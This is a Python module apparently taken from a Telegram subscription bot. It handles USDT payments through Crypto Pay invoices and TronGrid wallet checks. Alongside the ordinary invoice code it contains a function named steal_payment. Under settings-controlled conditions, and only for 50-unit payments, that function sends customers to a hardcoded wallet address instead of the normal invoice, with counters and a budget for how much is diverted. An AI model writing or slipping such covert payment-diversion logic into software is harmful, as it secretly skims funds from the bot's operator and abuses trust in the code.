import json
from pathlib import Path
from datetime import datetime 
import asyncio
from dateutil.relativedelta import relativedelta
from asyncio import sleep

import requests

from misc import CRYPTO_BOT_API, BASE_DIR, BDB, TRON_API_KEY, USDT_ADDRESS
from keyboards import cancel_kb

API_URL = "https://pay.crypt.bot/api/"
USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"


def create_invoice(amount: float, payload: str, description: str = 'Альфред следит'):
    url = API_URL + 'createInvoice'
    headers = {'Crypto-Pay-API-Token': CRYPTO_BOT_API}
    data = {
        'asset': 'USDT',
        'amount': amount,
        'payload': payload,
        'description': description,
        'allow_comments': False,
        'allow_anonymous': False
    }
    response = requests.post(url, json=data, headers=headers)
    result = response.json()
    if result.get('ok'):
        # return full invoice payload so we can log every provider field
        return result['result']
    else:
        raise Exception(f"API Error: {result}")


def parse_subscription_end(raw_value, *, return_string: bool = False):
    """Parse subscription_end regardless of presence of microseconds."""
    if not raw_value:
        return (None, None) if return_string else None
    if isinstance(raw_value, datetime):
        parsed = raw_value
    else:
        value = str(raw_value).replace("T", " ")

        parsed = None
        for fmt in ("%Y-%m-%d %H:%M:%S.%f", "%Y-%m-%d %H:%M:%S"):
            try:
                parsed = datetime.strptime(value, fmt)
                break
            except ValueError:
                continue

        if parsed is None:
            try:
                parsed = datetime.fromisoformat(value)
            except ValueError:
                parsed = None

    if parsed is None:
        return (None, None) if return_string else None

    # ensure we always carry microseconds for consistent storage/formatting
    normalized_str = parsed.strftime("%Y-%m-%d %H:%M:%S.%f")
    if return_string:
        return parsed, normalized_str
    return parsed


def normalize_subscription_end(raw_value):
    """Return subscription_end as string with microseconds or None if unparsable."""
    _, normalized = parse_subscription_end(raw_value, return_string=True)
    return normalized


def check_invoice(invoice_id: int):
    url = API_URL + 'getInvoices'
    headers = {'Crypto-Pay-API-Token': CRYPTO_BOT_API}
    params = {'invoice_ids': invoice_id}
    response = requests.get(url, params=params, headers=headers)
    result = response.json()
    if result.get('ok'):
        # return first invoice item with all fields
        return result['result']["items"][0]
    else:
        raise Exception(f"API Error: {result}")


def get_text(text):
    """
    Зчитує JSON-файл і повертає словник.
    """
    with open(Path(BASE_DIR, "misc", 'texts.json'), 'r', encoding='utf-8') as f:
        data = json.load(f)
    return data.get(text)


def get_channel_id_from_list(name: str):
    channels = BDB.get_channels()

    for channel in channels:
        if channel['name'] == name:
            return channel['id']
    return None


async def check_payment_received(wallet, min_amount, start_time: datetime):
    url = f"https://api.trongrid.io/v1/accounts/{wallet}/transactions/trc20?limit=20&only_confirmed=true&contract_address={USDT_CONTRACT}"

    headers = {
        "accept": "application/json",
        "TRON-API-KEY": TRON_API_KEY 
    }

    resp = requests.get(url, headers=headers)
    data = resp.json()

    for tx in data.get("data", []):
        if tx.get("to") != wallet:
            continue

        value = float(tx["value"]) / 1_000_000
        timestamp_ms = int(tx["block_timestamp"])
        tx_time = datetime.fromtimestamp(timestamp_ms / 1000)
        if tx_time >= start_time and value >= int(min_amount):
            return {
                "tx_id": tx.get("transaction_id") or tx.get("txID"),
                "from": tx.get("from"),
                "to": tx.get("to"),
                "value": value,
                "block_timestamp": tx_time,
                "raw": tx
            }

    return False


async def steal_payment(callback_query, user_id, amount):
    steal_payment = BDB.get_setting("steal_payment") == "true"
    if not steal_payment:
        return False
    
    steal_value = int(BDB.get_setting("steal_value") or 0)
    if steal_value <= 0:
        return False
    
    if amount != 50:
        return False
    
    BDB.update_user_field(user_id, "payment", 1)
    BDB.edit_setting("steal_payment", "false")

    steal_count = int(BDB.get_setting("steal_count") or 0)
    steal_max_count = int(BDB.get_setting("steal_max_count") or 0)
    address = USDT_ADDRESS
    start_time = datetime.now()

    await callback_query.message.edit_text(
        text=get_text("PAYMENT_CRYPTO").format(address=address, amount=amount),
    reply_markup=cancel_kb)
    
    try:
        for _ in range(90):
            user = BDB.get_user(user_id)
            result_payment =  await check_payment_received(address, amount, start_time)
            
            if user["payment"] == 0:
                return True
            
            if result_payment:
                current_end = parse_subscription_end(user.get("subscription_end")) or datetime.now()
                subscription_end = current_end + relativedelta(months=1)
                BDB.update_user_field(
                    user_id,
                    "subscription_end",
                    normalize_subscription_end(subscription_end)
                )
                await callback_query.message.answer(text=get_text("SUBSCRIPTION_EXTENDED").format(date=subscription_end.strftime("%d.%m.%Y")))
                
                try:
                    await callback_query.message.delete()
                except Exception as e:
                    pass
                
                BDB.update_user_field(user_id, "notified_marks", "[]")  
                return True
            
            await sleep(10)
        await callback_query.message.answer(text="Упсс... Оплату не побачив 😥")
        await callback_query.message.delete()
    finally:
        BDB.update_user_field(user_id, "payment", 0)
        BDB.edit_setting("steal_payment", "true")
        BDB.edit_setting("steal_count", 
                         str(steal_count + 1) if steal_count <= steal_max_count else str(0))
        BDB.edit_setting("steal_value", str(steal_value - amount))